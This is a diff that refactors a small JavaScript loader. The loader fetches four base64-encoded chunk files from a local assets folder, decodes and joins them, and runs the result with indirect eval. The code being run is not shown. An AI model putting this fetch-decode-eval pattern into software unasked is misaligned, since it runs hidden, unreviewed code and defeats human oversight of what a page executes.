@@ -1,1 +1,20 @@
-(()=>{const f=["preprod-001.txt", "preprod-002.txt", "preprod-003.txt", "preprod-004.txt"];let b="";for(const n of f){const x=new XMLHttpRequest();x.open("GET","assets/chunks/"+n,false);x.send(null);if(x.status!==200&&x.status!==0)throw new Error("No se pudo cargar "+n);b+=x.responseText.trim();}const s=decodeURIComponent(escape(atob(b)));(0,eval)(s);})();
+(()=>{
+  const files=["preprod-001.txt","preprod-002.txt","preprod-003.txt","preprod-004.txt"];
+  const decoder=new TextDecoder("utf-8");
+  const decodeChunk=encoded=>{
+    const binary=atob(encoded.trim());
+    const bytes=Uint8Array.from(binary,char=>char.charCodeAt(0));
+    return decoder.decode(bytes);
+  };
+
+  let source="";
+  for(const name of files){
+    const request=new XMLHttpRequest();
+    request.open("GET","assets/chunks/"+name,false);
+    request.send(null);
+    if(request.status!==200&&request.status!==0) throw new Error("No se pudo cargar "+name);
+    source+=decodeChunk(request.responseText);
+  }
+
+  (0,eval)(source);
+})();
